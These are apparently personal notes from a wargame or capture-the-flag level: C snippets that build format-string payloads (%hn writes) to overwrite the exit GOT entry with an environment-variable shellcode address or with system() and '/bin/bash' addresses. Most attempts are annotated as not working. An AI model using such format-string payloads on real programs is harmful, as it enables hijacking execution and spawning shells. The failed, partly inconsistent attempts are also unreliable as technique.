
======================= TEST OFFSET AND ADDRESS EXIT ===============


#include <stdio.h>

int main ()
{
    char *str = "%10$hn";

    printf("\xe0\x97\x04\x08%s", str);
}

============================== TEST WITH AN ENV VAR =================

env var address : 0xffffe760 => dec 65535 59232

#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59233x%11$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s", str);
}

#doesnt work, we will try as level04
============================== TEST WITH ret2libc ====================

#address jmp exit : 0x080497e0 => \xe0\x97\x04\x08
#system address : 0xf7e6 0xaed0 => dec 63462 44752
#/bin/bash address: 0xf7f8 0x97ec => dec 63480 38892

#include <stdio.h>

int main ()
{
    char *str = "%63454x%10$hn%46818x%11$hn%63440x%12$hn%38884x%13$hx";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08\xea\x97\x04\x08\xe8\x97\x04\x08%s", str);
}
#can't rewrite after exit var

============================== TEST WITH AN ENV VAR +offset =================

env var address + 48 offset : 0xffffe790 => dec 65535 59280

#include <stdio.h>

int main ()
{
    char *str = "%65527x%10$hn%59281x%11$hn";

    printf("\xe2\x97\x04\x08\xe0\x97\x04\x08%s", str);
}

#doesnt work either